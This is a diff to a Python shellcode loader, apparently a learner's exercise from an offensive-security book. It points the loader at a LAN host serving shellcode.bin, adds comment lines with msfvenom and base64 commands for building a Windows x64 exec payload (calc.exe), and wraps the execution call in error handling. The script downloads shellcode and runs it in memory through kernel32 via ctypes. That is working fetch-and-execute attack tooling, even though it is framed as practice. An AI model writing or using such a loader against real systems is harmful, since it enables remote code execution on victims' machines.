@@ -3,7 +3,14 @@ from urllib import request
 import base64
 import ctypes
 
-URL = 'http://192.168.1.xxx:xxxx/shellcode.bin'
+URL = 'http://192.168.1.145/shellcode.bin'
+
+#? Proper syntax for shellcode creation in msfvenom for a 64 bit system is:
+
+#! msfvenom -p windows/x64/exec -f raw cmd=calc.exe -o shellcode.raw
+#! base64 -w 0 -i shellcode.raw > shellcode.bin
+
+#? Not the incorrect example in the f-ing book....
 
 kernel32 = ctypes.windll.kernel32
 
@@ -98,6 +105,10 @@ def run(shellcode):
 if __name__ == '__main__':
     url = URL
     shellcode = get_code(URL)
-    run(shellcode)
+
+    try:
+        run(shellcode)
+    except Exception as e:
+        print(f'Will Python crash?  {e}')
     #? the run function will call write_memory 
 
